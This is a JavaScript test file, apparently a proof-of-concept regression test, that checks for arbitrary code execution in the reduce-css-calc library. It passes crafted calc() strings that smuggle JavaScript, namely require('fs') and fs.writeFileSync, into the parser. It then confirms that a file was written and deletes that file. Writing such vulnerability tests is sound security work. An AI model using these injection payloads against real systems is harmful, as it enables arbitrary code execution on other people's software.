const v35 = () => {
    const v19 = expect.assertions(2);
    v19;
    const fs = require('fs');
    const reduceCSSCalc = require('reduce-css-calc');
    const path = './reduce-css-calc';
    file_exist = fs.existsSync(path);
    const v20 = expect(file_exist);
    const v21 = v20.toBe(false);
    v21;
    try {
        const v22 = `calc(                       (Buffer(10000)))`;
        const v23 = reduceCSSCalc(v22);
        const v24 = console.log(v23);
        v24;
        const v25 = `calc(                       (global['fs'] = require('fs')))`;
        const v26 = reduceCSSCalc(v25);
        const v27 = console.log(v26);
        v27;
        const v28 = `calc(                       (fs['writeFileSync']("reduce-css-calc", "")))`;
        const v29 = reduceCSSCalc(v28);
        const v30 = console.log(v29);
        v30;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v31 = expect(file_exist);
    const v32 = v31.toBe(true);
    v32;
    const v33 = function (err) {
    };
    const v34 = fs.unlink(path, v33);
    v34;
};
const v36 = test('Arbitrary code execution in reduce-css-calc', v35);
v36;